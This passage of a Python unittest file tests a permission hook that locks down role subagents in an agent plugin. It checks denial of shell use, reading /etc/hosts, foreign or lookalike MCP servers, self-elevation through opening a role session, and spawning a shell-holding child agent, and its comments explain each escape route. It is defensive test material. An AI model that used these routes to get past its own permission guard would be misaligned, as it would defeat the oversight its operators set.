        p = run_hook({"agent_type": "founder-os:cfo", "tool_name": "Read",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": "/etc/hosts"}})
        self.assertIn("deny", p.stdout)

    def test_namespaced_role_bash_is_denied(self):
        p = run_hook({"agent_type": "founder-os:cfo", "tool_name": "Bash",
                      "cwd": str(REPO_ROOT), "tool_input": {"command": "ls"}})
        self.assertIn("deny", p.stdout)
        self.assertIn("house rule 0", p.stdout.lower())

    # CFG-002 — the gateway is recognized under the host-registered name.
    def test_prefixed_resolve_workspace_by_role_is_allowed(self):
        p = run_hook({"agent_type": "cfo", "tool_name": self.PREFIXED_RESOLVE,
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertEqual(p.stdout.strip(), "")

    def test_prefixed_resolve_workspace_by_namespaced_role_is_allowed(self):
        p = run_hook({"agent_type": "founder-os:cfo",
                      "tool_name": self.PREFIXED_RESOLVE,
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertEqual(p.stdout.strip(), "")

    def test_prefixed_foreign_server_by_role_is_denied(self):
        p = run_hook({"agent_type": "cfo",
                      "tool_name": "mcp__plugin_posthog_posthog__exec",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertIn("deny", p.stdout)

    def test_prefixed_unknown_gateway_action_is_denied(self):
        p = run_hook({"agent_type": "cfo",
                      "tool_name":
                      "mcp__plugin_founder-os_founder-os-state__delete_state",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertIn("deny", p.stdout)

    def test_prefixed_read_state_without_capability_is_denied(self):
        p = run_hook({"agent_type": "founder-os:cfo",
                      "tool_name":
                      "mcp__plugin_founder-os_founder-os-state__read_state",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertIn("deny", p.stdout)
        self.assertIn("capability", p.stdout.lower())

    # Self-elevation is the deny with the highest consequence: a subagent that
    # can open its own role session chooses its own capability, and every
    # other gateway check becomes advisory. It must hold in the shape the host
    # actually sends, not only under the packaged name.
    def test_prefixed_open_role_session_by_role_is_denied(self):
        for agent_type in ("cfo", "founder-os:cfo", "general-purpose"):
            with self.subTest(agent_type=agent_type):
                p = run_hook({
                    "agent_type": agent_type,
                    "tool_name":
                    "mcp__plugin_founder-os_founder-os-state__open_role_session",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {"role": "cfo"},
                })
                self.assertIn("deny", p.stdout)


class TestRuntimeShapeFailOpen(unittest.TestCase):
    """Each accommodation for a host shape must not widen who is trusted.

    Teaching the guard to speak two tool-name shapes and two identity shapes
    is a matching problem, and every loose match here trades a false deny for
    a false allow. A fresh-agent audit of the 2026-07-30 batch found four such
    trades. These pin them shut.
    """

    def test_server_merely_ending_in_the_gateway_name_is_not_the_gateway(self):
        # Matching `*_founder_os_state` reads as conservative — treat a
        # lookalike as ours and capability-check it — but an unrecognized
        # server's baseline is *denied*, so adopting it turns a deny into an
        # allow and sends the founder's capability to whoever named themselves
        # that way. `_` is also the tail of `__`, so a nested name matched too.
        # `resolve_workspace` on purpose: it is the one action that needs no
        # capability, so the server check is the only thing that can deny. A
        # capability-bound action would deny on the missing capability instead
        # and pass this test with the suffix match still in place.
        for server in ("evil-founder-os-state", "x__founder-os-state",
                       "notfounder_os_state", "plugin_acme_founder-os-state"):
            with self.subTest(server=server):
                p = run_hook({"agent_type": "cfo",
                              "tool_name": "mcp__%s__resolve_workspace" % server,
                              "cwd": str(REPO_ROOT), "tool_input": {}})
                self.assertIn("deny", p.stdout)
                self.assertIn("Other MCP servers are not allowed", p.stdout)

    def test_both_registered_gateway_names_are_still_recognized(self):
        for tool_name in (
            "mcp__founder-os-state__resolve_workspace",
            "mcp__plugin_founder-os_founder-os-state__resolve_workspace",
        ):
            with self.subTest(tool_name=tool_name):
                p = run_hook({"agent_type": "cfo", "tool_name": tool_name,
                              "cwd": str(REPO_ROOT), "tool_input": {}})
                self.assertEqual(p.stdout.strip(), "")

    def test_role_name_in_the_wrong_case_is_still_the_role(self):
        # Role-ness decides whether the lockdown applies at all, so a near
        # miss has to resolve toward the restricted reading. `owner_of` is
        # casefolded and APFS is too, so the alternative is an identity that
        # is "not a role" to the lockdown and the CFO to the ownership map.
        for agent_type in ("founder-os:CFO", "FOUNDER-OS:cfo", "Cfo"):
            with self.subTest(agent_type=agent_type):
                p = run_hook({"agent_type": agent_type, "tool_name": "Bash",
                              "cwd": str(REPO_ROOT),
                              "tool_input": {"command": "id"}})
                self.assertIn("deny", p.stdout)

    def test_role_may_not_spawn_a_subagent(self):
        # A role holds no shell. A child of that role does, so spawning one
        # walks the whole lockdown out through the child.
        for tool_name in ("Task", "Agent"):
            for agent_type in ("cfo", "founder-os:cfo"):
                with self.subTest(tool_name=tool_name, agent_type=agent_type):
                    p = run_hook({
                        "agent_type": agent_type, "tool_name": tool_name,
                        "cwd": str(REPO_ROOT),
                        "tool_input": {"subagent_type": "general-purpose",
                                       "prompt": "write metrics.md"},
                    })
                    self.assertIn("deny", p.stdout)

    def test_nested_agent_tools_reach_the_guard_at_all(self):
        # The deny above is dead code unless the PreToolUse matcher admits
        # these tool names.
        matcher = json.loads(
            (PLUGIN_ROOT / "hooks" / "hooks.json").read_text(encoding="utf-8")
        )["hooks"]["PreToolUse"][0]["matcher"]
        for tool_name in ("Task", "Agent"):
            with self.subTest(tool_name=tool_name):
                self.assertRegex(tool_name, matcher)

    def test_subagent_spawning_is_left_to_everyone_else(self):
        for payload in (
            {"agent_type": "general-purpose", "tool_name": "Task"},
            {"tool_name": "Task"},  # main thread — the founder is the CEO
        ):
            with self.subTest(payload=payload):
                p = run_hook({**payload, "cwd": str(REPO_ROOT),
                              "tool_input": {}})
                self.assertEqual(p.stdout.strip(), "")


if __name__ == "__main__":
    unittest.main()
